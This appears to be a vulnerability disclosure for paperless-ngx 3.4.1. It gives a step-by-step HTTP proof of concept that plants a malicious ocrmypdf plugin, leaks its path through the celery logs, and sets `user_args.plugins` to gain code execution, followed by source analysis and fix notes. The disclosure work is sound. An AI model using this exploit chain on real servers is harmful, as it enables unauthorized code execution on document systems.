### Vulnerability details

**Official website / Product:** https://docs.paperless-ngx.com / https://github.com/paperless-ngx/paperless-ngx

**Repository:** paperless-ngx/paperless-ngx (stars at selection: 47522)

**Vulnerability type:** RCE / getshell

**Vulnerability versions:** paperless-ngx 3.4.1 (official image `ghcr.io/paperless-ngx/paperless-ngx:latest`, response header `x-version: 3.4.1`); audited source tip `5b63c9a0ffbf8d535a92a9644d1d3a031a08fff4`

**Vulnerability URL / Parameter:** `PATCH /api/config/1/` field `user_args.plugins` (with `POST /api/documents/post_document/` to plant a malicious `.py` and to trigger OCR via PDF; path leak via `GET /api/logs/celery/`)

**Complex:** yes

### Verification procedure

1. Start the lab. Rebuild an equivalent stack from upstream `docker/compose/docker-compose.sqlite-tika.yml` (tag `v3.4.1`): image `ghcr.io/paperless-ngx/paperless-ngx:3.4.1` (or then-`latest` ≡ 3.4.1); host port **20206→8000**; admin `admin` / `adminadmin`. Verified compose project prefix `paperless-r22a6` (container `paperless-r22a6-webserver-1`). Minimal compose:

```yaml
services:
  broker:
    image: docker.io/valkey/valkey:9-alpine
    volumes: [redisdata:/data]
  webserver:
    image: ghcr.io/paperless-ngx/paperless-ngx:3.4.1
    depends_on: [broker, gotenberg, tika]
    ports: ["20206:8000"]
    volumes:
      - data:/usr/src/paperless/data
      - media:/usr/src/paperless/media
    environment:
      PAPERLESS_REDIS: redis://broker:6379
      PAPERLESS_DBENGINE: sqlite
      PAPERLESS_SECRET_KEY: change-me-lab-only
      PAPERLESS_ADMIN_USER: admin
      PAPERLESS_ADMIN_PASSWORD: adminadmin
      PAPERLESS_TIKA_ENABLED: "1"
      PAPERLESS_TIKA_GOTENBERG_ENDPOINT: http://gotenberg:3000
      PAPERLESS_TIKA_ENDPOINT: http://tika:9998
  gotenberg:
    image: docker.io/gotenberg/gotenberg:8.37
    command: ["gotenberg", "--chromium-disable-javascript=true", "--chromium-allow-list=^file:///tmp/.*"]
  tika:
    image: docker.io/apache/tika:3.3.1.0
volumes: {data: {}, media: {}, redisdata: {}}
```

Run `docker compose up -d` and wait for the webserver (container name prefix follows the compose project directory).
2. Obtain an API Token: `POST /api/token/` with body `{"username":"admin","password":"adminadmin"}`. Packets below use the lab-captured token `a727b322bdc58e6d9de887552b0a0ceaa80be435` (changes on redeploy — substitute yours).
3. Upload an anchor document that occupies ASN `12345`: `POST /api/documents/post_document/` with `archive_serial_number=12345` and file `asn_holder.txt` (any consumable text). After consume succeeds, ASN `12345` is taken.
4. Upload `pwn_final.py` (malicious ocrmypdf plugin) with the **same ASN 12345**. `AsnCheckPlugin` / `pre_check_asn_value` raises `ConsumerError`; the scratch original is **not unlinked** and the upload filename keeps the `.py` suffix.
5. As staff, `GET /api/logs/celery/` and read `PosixPath('/tmp/paperless/tmpyzmjx3p7/pwn_final.py')` from celery `kwargsrepr`.
6. `PATCH /api/config/1/` setting `user_args` to a JSON **string** containing `plugins: [<leaked path>]` (`JSONField(binary=True)` requires double encoding). `validate_user_args` only requires a JSON object — **no key allowlist**.
7. Upload any OCR-eligible PDF to trigger consume. `RasterisedDocumentParser` merges `user_args` into `ocrmypdf.ocr(**args)` without filtering; ocrmypdf loads `.py` plugins via `spec_from_file_location` + `exec_module`.
8. Container file `/tmp/r22a6-final-pwn` contains `uid=1000(paperless)` and a marker — getshell proof.

Privileges: authenticated user with `change_applicationconfiguration` (DjangoModelPermissions); log leak also needs `is_staff`. Default admin has all. If the attacker already knows a writable `.py` absolute path, the log step is optional.

### Complete vulnerability PoC

#### 0) Obtain Token

```http
POST /api/token/ HTTP/1.1
Host: 127.0.0.1:20206
Accept: application/json
Content-Type: application/json
Content-Length: 47

{"username":"admin","password":"adminadmin"}
```

Successful response looks like `{"token":"a727b322bdc58e6d9de887552b0a0ceaa80be435"}` (lab-captured; changes on redeploy).

#### 1) Anchor upload (occupy ASN 12345)

(Reconstructed from lab celery logs; filename `asn_holder.txt`; consume succeeds and stores ASN.)

```http
POST /api/documents/post_document/ HTTP/1.1
Host: 127.0.0.1:20206
Authorization: Token a727b322bdc58e6d9de887552b0a0ceaa80be435
Accept: application/json
Content-Type: multipart/form-data; boundary=----r22a6Anchor
Content-Length: 312

------r22a6Anchor
Content-Disposition: form-data; name="title"

asn_holder
------r22a6Anchor
Content-Disposition: form-data; name="archive_serial_number"

12345
------r22a6Anchor
Content-Disposition: form-data; name="document"; filename="asn_holder.txt"
Content-Type: text/plain

anchor for ASN 12345

------r22a6Anchor--
```

Expected: HTTP 200 with a task UUID; celery consume succeeds (`document_id` assigned, ASN 12345 stored).

#### 2) Upload malicious plugin (ASN conflict, scratch retained)

Complete HTTP request (Docker-verified):

```http
POST /api/documents/post_document/ HTTP/1.1
Host: 127.0.0.1:20206
Authorization: Token a727b322bdc58e6d9de887552b0a0ceaa80be435
Accept: application/json
Content-Type: multipart/form-data; boundary=----r22a6Boundary7MA4YWxk
Content-Length: 501

------r22a6Boundary7MA4YWxk
Content-Disposition: form-data; name="title"

pwn_final
------r22a6Boundary7MA4YWxk
Content-Disposition: form-data; name="archive_serial_number"

12345
------r22a6Boundary7MA4YWxk
Content-Disposition: form-data; name="document"; filename="pwn_final.py"
Content-Type: text/plain

import os
os.system("id >/tmp/r22a6-final-pwn; echo R22A6_GETSHELL_1793565335 >>/tmp/r22a6-final-pwn")
def initialize(plugin_manager=None):
    pass

------r22a6Boundary7MA4YWxk--
```

Complete HTTP response:

```http
HTTP/1.1 200 OK
content-type: application/json
vary: Accept, Accept-Language, origin, Cookie
allow: POST, OPTIONS
x-frame-options: SAMEORIGIN
x-api-version: 10
x-version: 3.4.1
content-length: 38
content-language: en-us
x-content-type-options: nosniff
referrer-policy: same-origin
cross-origin-opener-policy: same-origin
server: granian
connection: close
date: Sun, 01 Nov 2026 20:35:35 GMT

"f95ef5ec-6031-4e85-870c-c303846fd3b6"
```

Celery then errors with `ConsumerError: pwn_final.py: Not consuming pwn_final.py: Given ASN 12345 already exists!`, but `/tmp/paperless/tmpyzmjx3p7/pwn_final.py` remains on disk.

#### 3) Leak absolute path via logs

Complete HTTP request:

```http
GET /api/logs/celery/ HTTP/1.1
Host: 127.0.0.1:20206
Authorization: Token a727b322bdc58e6d9de887552b0a0ceaa80be435
Accept: application/json
```

Response headers (body is a ~39910-byte JSON string array; when reproducing, search the array for `pwn_final.py` / `PosixPath`):

```http
HTTP/1.1 200 OK
content-type: application/json
vary: Accept, Accept-Language, origin, Cookie, Accept-Encoding
allow: GET, HEAD, OPTIONS
x-frame-options: SAMEORIGIN
x-api-version: 10
x-version: 3.4.1
content-length: 39910
content-language: en-us
x-content-type-options: nosniff
referrer-policy: same-origin
cross-origin-opener-policy: same-origin
server: granian
connection: close
date: Sun, 01 Nov 2026 20:35:40 GMT
```

Body excerpt proving the path leak (celery `kwargsrepr` and ERROR; verified log lines):

```
[2026-11-01 20:35:35,986] [DEBUG] [celery.pool] TaskPool: Apply <function fast_trace_task ...> (args:('documents.tasks.consume_file', 'f95ef5ec-6031-4e85-870c-c303846fd3b6', {..., 'kwargsrepr': "{'input_doc': ConsumableDocument(source=<DocumentSource.ApiUpload: 2>, original_file=PosixPath('/tmp/paperless/tmpyzmjx3p7/pwn_final.py'), ... mime_type='text/plain'), 'overrides': DocumentMetadataOverrides(filename='pwn_final.py', title='pwn_final', ... asn=12345, owner_id=2, ...)}", ...})
[2026-11-01 20:35:36,041] [ERROR] [celery.app.trace] Task documents.tasks.consume_file[f95ef5ec-6031-4e85-870c-c303846fd3b6] raised unexpected: ConsumerError('pwn_final.py: Not consuming pwn_final.py: Given ASN 12345 already exists!')
documents.consumer.ConsumerError: pwn_final.py: Not consuming pwn_final.py: Given ASN 12345 already exists!
```

Note: the scratch directory name is random per upload (here `tmpyzmjx3p7`); use the `PosixPath('...')` value from your logs for the next `plugins` step.

#### 4) Write user_args.plugins (critical sink)

Complete HTTP request (Docker-verified):

```http
PATCH /api/config/1/ HTTP/1.1
Host: 127.0.0.1:20206
Authorization: Token a727b322bdc58e6d9de887552b0a0ceaa80be435
Accept: application/json
Content-Type: application/json
Content-Length: 77

{"user_args": "{\"plugins\": [\"/tmp/paperless/tmpyzmjx3p7/pwn_final.py\"]}"}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
content-type: application/json
vary: Accept, Accept-Language, origin, Cookie, Accept-Encoding
allow: GET, PUT, PATCH, DELETE, HEAD, OPTIONS
x-frame-options: SAMEORIGIN
x-api-version: 10
x-version: 3.4.1
content-length: 1479
content-language: en-us
x-content-type-options: nosniff
referrer-policy: same-origin
cross-origin-opener-policy: same-origin
server: granian
connection: close
date: Sun, 01 Nov 2026 20:36:05 GMT

{"id":1,"externally_configured_variables":["PAPERLESS_ADMIN_PASSWORD","PAPERLESS_ADMIN_USER","PAPERLESS_CSRF_TRUSTED_ORIGINS","PAPERLESS_DBENGINE","PAPERLESS_OCR_LANGUAGE","PAPERLESS_REDIS","PAPERLESS_SECRET_KEY","PAPERLESS_SRC_DIR","PAPERLESS_START_TIME_S","PAPERLESS_TIKA_ENABLED","PAPERLESS_TIKA_ENDPOINT","PAPERLESS_TIKA_GOTENBERG_ENDPOINT","PAPERLESS_URL"],"user_args":"{\"plugins\": [\"/tmp/paperless/tmpyzmjx3p7/pwn_final.py\"]}","barcode_tag_mapping":null,"llm_embedding_api_key":null,"llm_api_key":null,"remote_ocr_api_key":null,"output_type":null,"pages":null,"language":null,"mode":null,"archive_file_generation":null,"image_dpi":null,"unpaper_clean":null,"deskew":null,"rotate_pages":null,"rotate_pages_threshold":null,"max_image_pixels":null,"color_conversion_strategy":null,"app_title":null,"app_logo":null,"barcodes_enabled":null,"barcode_enable_tiff_support":null,"barcode_string":null,"barcode_retain_split_pages":null,"barcode_enable_asn":null,"barcode_asn_prefix":null,"barcode_upscale":null,"barcode_dpi":null,"barcode_max_pages":null,"barcode_enable_tag":null,"barcode_tag_split":null,"barcode_store_values":null,"remote_ocr_engine":null,"remote_ocr_endpoint":null,"remote_ocr_mode":null,"ai_enabled":null,"llm_embedding_backend":null,"llm_embedding_model":null,"llm_embedding_endpoint":null,"llm_embedding_chunk_size":null,"llm_context_size":null,"llm_backend":null,"llm_model":null,"llm_endpoint":null,"llm_output_language":null,"llm_request_timeout":null}
```

#### 5) Upload PDF to trigger OCR / plugin load

Any PDF that reaches `RasterisedDocumentParser`→`ocrmypdf` works (lab filename `trigger_rce.pdf`). Multipart below matches the verified flow; body includes a minimal PDF sketch, or substitute any OCR-eligible local PDF:

```http
POST /api/documents/post_document/ HTTP/1.1
Host: 127.0.0.1:20206
Authorization: Token a727b322bdc58e6d9de887552b0a0ceaa80be435
Accept: application/json
Content-Type: multipart/form-data; boundary=----r22a6Trigger

------r22a6Trigger
Content-Disposition: form-data; name="title"

trigger_rce
------r22a6Trigger
Content-Disposition: form-data; name="document"; filename="trigger_rce.pdf"
Content-Type: application/pdf

%PDF-1.4
1 0 obj<< /Type /Catalog /Pages 2 0 R >>endobj
2 0 obj<< /Type /Pages /Kids [3 0 R] /Count 1 >>endobj
3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R >>endobj
4 0 obj<< /Length 44 >>stream
BT /F1 12 Tf 100 100 Td (trigger) Tj ET
endstream
endobj
xref
0 5
trailer<< /Root 1 0 R /Size 5 >>
startxref
0
%%EOF

------r22a6Trigger--
```

Equivalent curl: `curl -sS -H 'Authorization: Token a727b322bdc58e6d9de887552b0a0ceaa80be435' -F 'title=trigger_rce' -F 'document=@trigger_rce.pdf;type=application/pdf' http://127.0.0.1:20206/api/documents/post_document/`

Complete HTTP response:

```http
HTTP/1.1 200 OK
content-type: application/json
vary: Accept, Accept-Language, origin, Cookie
allow: POST, OPTIONS
x-frame-options: SAMEORIGIN
x-api-version: 10
x-version: 3.4.1
content-length: 38
content-language: en-us
x-content-type-options: nosniff
referrer-policy: same-origin
cross-origin-opener-policy: same-origin
server: granian
connection: close
date: Sun, 01 Nov 2026 20:36:05 GMT

"1d31b82b-0dc7-4415-8667-f0a37109cbb9"
```

Verification result notes:

- PATCH returns HTTP 200 and echoes the stored `plugins` path in `user_args`.
- After the PDF OCR trigger, run inside the webserver container:

```bash
docker exec paperless-r22a6-webserver-1 cat /tmp/r22a6-final-pwn
```

Expected output:

```
uid=1000(paperless) gid=1000(paperless) groups=1000(paperless)
R22A6_GETSHELL_1793565335
```

- Impact file owner is `uid=1000(paperless)`, proving the plugin was loaded via `exec_module` as the paperless worker.

### Vulnerability analysis

Paperless exposes ApplicationConfiguration `user_args` as a passthrough “OCR tuning JSON” for ocrmypdf. Validation only checks that the value is a dict. ocrmypdf’s public API accepts `plugins=` and loads arbitrary `.py` files with `importlib.util.spec_from_file_location` + `exec_module`. A user who can write configuration can therefore point `plugins` at any on-host `.py` path and gain code execution as the paperless worker on the next OCR job.

To plant the `.py` over HTTP alone: failed consumes do not clean scratch — a duplicate-ASN upload fails in `AsnCheckPlugin.pre_check_asn_value` → `_fail` without unlinking `original_file`, and celery `kwargsrepr` leaks the absolute path to staff. That is distinct from the intentional `PRE_CONSUME_SCRIPT` / `POST_CONSUME_SCRIPT` env knobs.

Trigger / sink source (full path and line numbers):

```python
# File: src/paperless/serialisers.py
# Lines: 247-254
@staticmethod
def _require_json_object(field: str, value: object) -> None:
    if value is not None and not isinstance(value, dict):
        raise serializers.ValidationError(f"{field} must be a JSON object.")

def validate_user_args(self, value):
    self._require_json_object("user_args", value)
    return value
```

```python
# File: src/paperless/parsers/tesseract.py
# Lines: 352-354
if self.settings.user_args is not None:
    try:
        ocrmypdf_args = {**ocrmypdf_args, **self.settings.user_args}
```

```python
# File: /usr/local/lib/python3.14/site-packages/ocrmypdf/_plugin_manager.py (image dependency)
# Lines: 105-114
if isinstance(plugin, Path) or plugin.endswith('.py'):
    plugin_path = Path(plugin)
    module_name = plugin_path.stem
    spec = importlib.util.spec_from_file_location(module_name, plugin_path)
    ...
    spec.loader.exec_module(module)
```

```python
# File: src/documents/consumer.py
# Lines: 231-240 (_fail does not delete scratch), 1166-1175 (ASN conflict failure)
def _fail(self, message, log_message=None, exception=None, ...):
    self._send_progress(...)
    self.log.error(...)
    raise ConsumerError(f"{self.filename}: {log_message or message}") from exception
# original_file is unlinked only on successful consume (~774-804)
```

### Fix notes

1. Allowlist `user_args` keys to documented OCR tuning options only (`unpaper_args`, `jobs`, `rotate_pages`, …); explicitly reject `plugins` and any code/command-execution keys.
2. If plugins must remain, restrict to a signed/allowlisted plugin directory — never arbitrary absolute paths.
3. Clean scratch uploads on failed consume; avoid full local paths in celery `kwargsrepr` exposed via the logs API.
4. Treat `change_applicationconfiguration` as equivalent to host code execution in the permission model and docs.

